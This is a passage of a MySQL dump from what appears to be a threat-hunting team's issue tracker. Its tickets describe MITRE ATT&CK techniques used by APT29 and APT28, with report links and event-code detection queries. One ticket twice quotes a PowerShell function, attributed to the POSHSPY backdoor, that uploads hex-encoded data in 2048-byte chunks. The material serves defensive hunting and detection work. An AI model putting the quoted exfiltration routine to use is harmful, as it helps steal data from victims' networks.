  KEY `index_issue_statuses_on_position` (`position`),
  KEY `index_issue_statuses_on_is_closed` (`is_closed`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issue_statuses`
--

LOCK TABLES `issue_statuses` WRITE;
/*!40000 ALTER TABLE `issue_statuses` DISABLE KEYS */;
INSERT INTO `issue_statuses` VALUES (1,'Open',0,1,NULL),(2,'Closed',1,8,NULL),(4,'Awaiting MP',0,6,NULL),(5,'In Progress',0,2,NULL),(6,'On Hold',0,3,NULL),(7,'Awaiting RFI',0,7,NULL),(8,'Awaiting Intel',0,5,NULL),(9,'Replied',0,4,NULL);
/*!40000 ALTER TABLE `issue_statuses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issues`
--

DROP TABLE IF EXISTS `issues`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `issues` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tracker_id` int(11) NOT NULL,
  `project_id` int(11) NOT NULL,
  `subject` varchar(255) NOT NULL DEFAULT '',
  `description` longtext,
  `due_date` date DEFAULT NULL,
  `category_id` int(11) DEFAULT NULL,
  `status_id` int(11) NOT NULL,
  `assigned_to_id` int(11) DEFAULT NULL,
  `priority_id` int(11) NOT NULL,
  `fixed_version_id` int(11) DEFAULT NULL,
  `author_id` int(11) NOT NULL,
  `lock_version` int(11) NOT NULL DEFAULT '0',
  `created_on` timestamp NULL DEFAULT NULL,
  `updated_on` timestamp NULL DEFAULT NULL,
  `start_date` date DEFAULT NULL,
  `done_ratio` int(11) NOT NULL DEFAULT '0',
  `estimated_hours` float DEFAULT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `root_id` int(11) DEFAULT NULL,
  `lft` int(11) DEFAULT NULL,
  `rgt` int(11) DEFAULT NULL,
  `is_private` tinyint(1) NOT NULL DEFAULT '0',
  `closed_on` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `issues_project_id` (`project_id`),
  KEY `index_issues_on_status_id` (`status_id`),
  KEY `index_issues_on_category_id` (`category_id`),
  KEY `index_issues_on_assigned_to_id` (`assigned_to_id`),
  KEY `index_issues_on_fixed_version_id` (`fixed_version_id`),
  KEY `index_issues_on_tracker_id` (`tracker_id`),
  KEY `index_issues_on_priority_id` (`priority_id`),
  KEY `index_issues_on_author_id` (`author_id`),
  KEY `index_issues_on_created_on` (`created_on`),
  KEY `index_issues_on_root_id_and_lft_and_rgt` (`root_id`,`lft`,`rgt`),
  KEY `index_issues_on_parent_id` (`parent_id`)
) ENGINE=InnoDB AUTO_INCREMENT=179 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issues`
--

LOCK TABLES `issues` WRITE;
/*!40000 ALTER TABLE `issues` DISABLE KEYS */;
INSERT INTO `issues` VALUES (1,5,1,'Lateral Movement - Parent Ticket','\r\nThe adversary is trying to move through your environment.\r\n\r\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.\r\n',NULL,NULL,1,NULL,5,NULL,1,5,'2021-01-27 16:32:58','2021-04-16 15:57:34','2021-01-27',0,NULL,NULL,1,1,20,0,NULL),(2,5,1,'Use Alternate Authentication Material: Pass the ticket - T1550.003','Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account\'s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\r\n\r\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user\'s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\r\n\r\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\r\n\r\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\r\n\r\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.\r\n\r\nh3. Reference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1550\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n</pre>\r\n\r\nh3. Playbook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\nhttps://confluence.di2e.net/display/CYH836/APT+28%3A+Pass+the+Ticket\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,16,'2021-01-27 16:38:09','2021-05-06 15:45:50','2021-01-27',0,NULL,1,1,2,3,0,NULL),(3,5,1,'Remote Services - T1021','Adversaries may use Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\r\n\r\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1021\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=955904802',NULL,NULL,1,NULL,2,NULL,1,5,'2021-01-27 16:44:55','2021-04-16 17:11:37','2021-01-27',0,NULL,1,1,4,5,0,NULL),(4,5,1,'Exploitation of Remote Services - T1210','Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\r\n\r\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\r\n\r\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\r\n\r\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1210                                           \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1210+-+Exploitation+of+Remote+Service\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services\r\n',NULL,NULL,1,NULL,2,NULL,1,11,'2021-01-27 16:48:32','2021-05-06 15:53:23','2021-01-27',0,NULL,1,1,6,7,0,NULL),(5,5,1,'Persistence - Parent Ticket','Parent ticket for persistence hunts.\r\n\r\n\r\nThe adversary is trying to maintain their foothold.\r\n\r\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.\r\n',NULL,NULL,1,NULL,5,NULL,1,6,'2021-01-27 17:03:56','2021-04-16 16:04:05','2021-01-27',0,NULL,NULL,5,1,34,0,NULL),(6,5,1,'Valid Accounts - T1078','Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\r\n\r\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)\r\n\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1078\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf\r\nhttps://www.ncsc.gov.uk/files/Advisory-APT29-targets-COVID-19-vaccine-development-V1-1.pdf\r\n',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 17:08:53','2021-04-16 17:23:05','2021-04-16',0,NULL,5,5,2,3,0,NULL),(7,5,1,'External Remote Services - T1133','Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management can also be used externally.\r\n\r\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1133\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 17:09:49','2021-04-16 17:22:33','2021-01-27',0,NULL,5,5,4,5,0,NULL),(8,5,1,'Server Software Component - T1505','Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1505\r\nhttps://us-cert.cisa.gov/ncas/alerts/TA15-314A',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 17:12:36','2021-04-16 17:18:17','2021-01-27',0,NULL,5,5,6,7,0,NULL),(9,5,1,'Command & Control - Parent Ticket','\r\n\r\nThe adversary is trying to communicate with compromised systems to control them.\r\n\r\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.\r\n',NULL,NULL,1,NULL,5,NULL,1,3,'2021-01-27 17:14:12','2021-04-16 16:04:43','2021-01-27',0,NULL,NULL,9,1,62,0,NULL),(10,5,1,'Ingress Tool Transer - T1105',' Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp. ',NULL,NULL,1,NULL,2,NULL,1,6,'2021-01-27 17:16:41','2021-04-16 17:27:37','2021-01-27',0,NULL,9,9,2,3,0,NULL),(11,5,1,'Domain Generation Algorithms - T1568.002','Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,4,'2021-01-27 17:17:52','2021-04-16 17:30:45','2021-01-27',0,NULL,9,9,4,5,0,NULL),(12,5,1,'Data Encoding: Standard Encoding - T1132.001','Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1132/001\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 17:21:27','2021-04-16 17:29:02','2021-01-27',0,NULL,9,9,6,7,0,NULL),(13,5,1,'Application Layer Protocol: Web Protocols - T1071.001','Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\r\n\r\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.\r\n\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1071/001\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:23:04','2021-04-16 17:28:37','2021-01-27',0,NULL,9,9,8,9,0,NULL),(14,5,1,'Application Layer Protocol: DNS - T1071.004','Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\r\n\r\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1071/004\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:25:03','2021-04-16 17:27:56','2021-01-27',0,NULL,9,9,10,11,0,NULL),(15,5,1,'Web Service: Bidirectional Communication - T1102.002','Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.\r\n\r\nAPT29 has used social media platforms to hide communications to C2 servers.[2]\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 17:27:13','2021-04-16 17:13:42','2021-01-27',0,NULL,9,9,12,13,0,NULL),(16,5,1,'Encrypted Channel - T1573','APT29 has established SSL certificates on its infrastructure and its BEACON malware uses   SSL for C2 communications. POSHSPY malware encrypts communications using AES and RSA public key cryptography. SAYWHAT malware exfils data encrypted with RSA, RC4, and AES over HTTPS.\r\n\r\nReferences:\r\nhttps://www.pwc.co.uk/issues/cyber-security-services/insights/cleaning-up-after-wellmess.html\r\nhttps://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\r\n\r\n\r\n',NULL,NULL,1,NULL,2,NULL,1,1,'2021-01-27 17:28:42','2021-01-28 21:09:24','2021-01-27',0,NULL,9,9,14,15,0,NULL),(17,5,1,'Data Encoding - T1132','Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems. Some data encoding systems may also result in data compression, such as gzip. \r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:30:02','2021-04-16 17:31:46','2021-01-27',0,NULL,9,9,16,17,0,NULL),(19,5,1,'Fallback Channels - T1008','Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.\r\n\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1008\r\nhttps://www.welivesecurity.com/2019/10/17/operation-ghost-dukes-never-left/',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:32:42','2021-04-16 17:30:56','2021-01-27',0,NULL,9,9,18,19,0,NULL),(20,5,1,'Data Obfuscation - T1008','Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1008\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:33:37','2021-04-16 17:26:56','2021-01-27',0,NULL,9,9,20,21,0,NULL),(21,5,1,'Remote Access Software - T1219','An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\r\n\r\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\r\n\r\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1219\r\nhttps://BLOG-ASSETS.f-secure.com/wp-content/uploads/2019/10/15163418/CozyDuke.pdf\r\n\r\nNotes:\r\nevent.code : 1 OR 4688 -- \r\nevent.code : 3 OR 5167',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:34:58','2021-04-16 17:26:19','2021-01-27',0,NULL,9,9,22,23,0,NULL),(22,5,1,'Non-Application Layer Protocol - T1095','Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\r\n\r\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1095\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:36:19','2021-04-16 17:25:41','2021-01-27',0,NULL,9,9,24,25,0,NULL),(23,5,1,'Multi-Stage Channels - T1104','Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\r\n\r\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\r\n\r\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1104\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html \r\n\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:38:18','2021-04-16 17:25:06','2021-01-27',0,NULL,9,9,26,27,0,NULL),(24,5,1,'Dynamic Resolution - T1568','Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware\'s communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\r\n\r\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)\r\n\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1568\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:39:28','2021-04-16 17:24:22','2021-01-27',0,NULL,9,9,28,29,0,NULL),(25,5,1,'Application Layer Protocol - T1071','Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\r\n\r\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1071\r\nhttps://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:42:00','2021-04-16 17:23:52','2021-01-27',0,NULL,9,9,30,31,0,NULL),(26,5,1,'Exfiltration - Parent Ticket','\r\n\r\nThe adversary is trying to steal data.\r\n\r\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.\r\n',NULL,NULL,1,NULL,5,NULL,1,2,'2021-01-27 17:43:11','2021-04-16 16:05:39','2021-01-27',0,NULL,NULL,26,1,8,0,NULL),(27,5,1,'Transfer Data to Cloud Account - T1537','Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection. \r\n\r\nHAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.\r\n\r\nReferences:\r\nhttps://www.welivesecurity.com/2020/12/02/turla-crutch-keeping-back-door-open/\r\n\r\nNotes:\r\nevent.code : 5156 or 3 or 4688 -- \r\nevent.code : 3 AND DestinationHostname : github or dropbox or onedrive or 4shared',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 17:44:37','2021-04-16 17:24:41','2021-01-27',0,NULL,26,26,2,3,0,NULL),(28,5,1,'Exfiltration over C2 Channel - T1041','Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications. \r\n\r\nThe APT29 POSHSPY backdoor uploads data in 2048-byte chunks. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n\r\n\r\nNotes:\r\n<pre>\r\nevent.code : 5156 or 3 or 4688 -- \r\nThe following provides an example of data uploading in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\nThe following provides an example of uploading data in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 17:46:39','2021-04-16 17:26:08','2021-01-27',0,NULL,26,26,4,5,0,NULL),(29,5,1,'Data Transfer Size Limits - T1030','An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts. \r\n\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"',NULL,NULL,1,NULL,2,NULL,1,4,'2021-01-27 17:49:05','2021-04-16 17:29:00','2021-01-27',0,NULL,26,26,6,7,0,NULL),(30,5,1,'Defense Evasion - Parent Ticket','\r\n\r\nThe adversary is trying to avoid being detected.\r\n\r\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.\r\n',NULL,NULL,1,NULL,5,NULL,1,2,'2021-01-27 17:52:55','2021-04-16 16:06:02','2021-01-27',0,NULL,NULL,30,1,50,0,NULL),(31,5,1,'Obfuscated Files or Information - T1027','Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 17:53:55','2021-04-16 17:14:25','2021-01-27',0,NULL,30,30,2,3,0,NULL),(32,5,1,'Indicator Removal on Host: File Deletion - T1070.004',' Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary\'s footprint. \r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 17:55:21','2021-05-06 15:12:35','2021-01-27',0,NULL,30,30,4,5,0,NULL),(33,5,1,'Code Signing - T1553.002','Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. The certificates used during an operation may be created, acquired, or stolen by the adversary. Unlike Invalid Code Signature, this activity will result in a valid signature. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 18:00:17','2021-04-16 